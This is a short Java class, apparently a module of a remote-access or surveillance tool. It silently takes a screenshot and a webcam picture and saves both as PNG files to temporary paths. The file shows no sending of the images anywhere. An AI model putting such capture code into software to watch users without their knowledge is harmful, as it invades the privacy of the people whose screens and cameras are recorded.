import java.awt.Robot;
import java.io.File;
import javax.imageio.ImageIO;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import com.github.sarxos.webcam.Webcam;


public class PhotoCapture {
	public void takeScreenShot() {
		System.out.println("[*] Taking screenshot");
		try {
			Robot r = new Robot();
			BufferedImage screenshot = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(screenshot, "PNG", new File(Constants.tempscreen));
		} catch (Exception e) {
			System.out.println("[-] Screenshot error");
		}
	}

	public void takeCameraShot() {
		System.out.println("[*] Taking camera shot");
		try {
			Webcam w = Webcam.getDefault();
			w.open();
			BufferedImage camerashot = w.getImage();
			ImageIO.write(camerashot, "PNG", new File(Constants.tempcamera));
			w.close();
		} catch (Exception e) {
			System.out.println("[-] Camera shot error");
		}
	}
}